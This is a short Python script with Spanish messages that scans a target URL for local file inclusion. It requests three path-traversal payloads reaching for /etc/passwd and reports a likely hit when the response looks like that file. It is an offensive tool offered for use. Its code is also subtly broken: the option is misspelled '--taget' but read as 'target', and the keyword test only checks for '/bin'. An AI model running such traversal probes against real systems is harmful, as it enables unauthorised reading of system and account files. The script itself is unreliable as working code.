import requests 
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--taget', help="Objetivo")
parser = parser.parse_args()

def main():
    payloads = ['../../../../../../../etc/passwd','../../../../etc/passwd','/etc/passwd']
    if parser.target:
        print("Objetivo => {}".format(parser.target))
        for p in payloads:
            print("\n=============================")
            print("Objetivo = {}".format(parser.target+p))
            query = requests.get(parser.target+p)
            if 'root' and 'bash' and '/bin' in query.text:
                print("Probable LFI: {}".format(parser.target+p))
                print("\n=============================")
    else:
        print("Especifique el objetivo")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()